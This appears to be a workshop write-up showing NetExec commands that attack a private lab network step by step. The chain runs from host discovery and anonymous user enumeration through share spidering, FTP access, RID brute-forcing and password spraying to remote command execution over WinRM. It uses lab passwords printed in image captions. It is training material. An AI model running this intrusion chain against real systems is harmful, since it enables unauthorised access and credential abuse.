---
description: https://www.netexec.wiki/
---

# 🎆 Le Hack 2k24 NetExec Workshop

<figure><img src="../.gitbook/assets/image (1204).png" alt=""><figcaption></figcaption></figure>

First we start by discovering the machines who are up:

```
netexec smb 10.0.0.0/24
```

<figure><img src="../.gitbook/assets/image (1205).png" alt=""><figcaption></figcaption></figure>

we then try enumerating users with the --users command and we find that 10.0.0.5 can be enumerated

```
nxc smb 10.0.0.5 -u '' -p '' --users
```

<figure><img src="../.gitbook/assets/image (1206).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

```
netexec smb 10.0.0.4 -u asterix -p '' -M spider_plus --shares
```

<figure><img src="../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (1210).png" alt=""><figcaption><p>heftepix / BnfMQ9QI81Tz</p></figcaption></figure>

```
netexec ftp 10.0.0.7 -u heftepix -p 'BnfMQ9QI81Tz' --ls
```

<figure><img src="../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

```
netexec ftp 10.0.0.7 -u heftepix -p 'BnfMQ9QI81Tz' --get wineremix
```

<figure><img src="../.gitbook/assets/image (1213).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1215).png" alt=""><figcaption><p>wUSYIuhhWy!!12OL</p></figcaption></figure>

```
nxc smb 10.0.0.4 -u Guest -p '' --rid-brute
```

<figure><img src="../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>

```
nxc winrm ./targets -u rid_accounts_2 -p 'wUSYIuhhWy!!12OL' --local-auth
```

<figure><img src="../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>

```
nxc winrm 10.0.0.7 -u 'localix' -p 'wUSYIuhhWy!!12OL' --local-auth -X 'whoami'
```

<figure><img src="../.gitbook/assets/image (1218).png" alt=""><figcaption></figcaption></figure>
